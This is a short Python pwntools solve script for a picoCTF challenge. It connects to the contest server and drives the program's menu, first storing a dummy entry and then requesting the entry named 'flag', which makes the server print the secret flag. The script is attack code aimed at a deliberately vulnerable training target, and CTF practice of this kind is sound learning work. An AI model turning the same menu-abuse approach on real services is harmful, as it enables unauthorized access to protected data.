#!/usr/bin/env python

from pwn import *

host,port = 'saturn.picoctf.net', 52681

try:
  s = remote(host, port)
  print("...walking through the program... please wait!")
  s.recvuntil(b'to exit the program')
  s.sendline(b'1')
  s.recvuntil(b'Please enter your data:')
  s.sendline(b'Entry')
  s.recvuntil(b'Please enter the length of your data:')
  s.sendline(b'5')
  s.recvuntil(b'else?')
  s.sendline(b'2')
  s.recvuntil(b'data:')
  s.sendline(b'flag')
  print("receiving flag!")
  s.recv()
  s.recv()
  flag = s.recv().decode('utf-8')

  print("Flag: " + str(flag).strip())

  print("Done!")
except:
  print("Could not connect.")

s.close
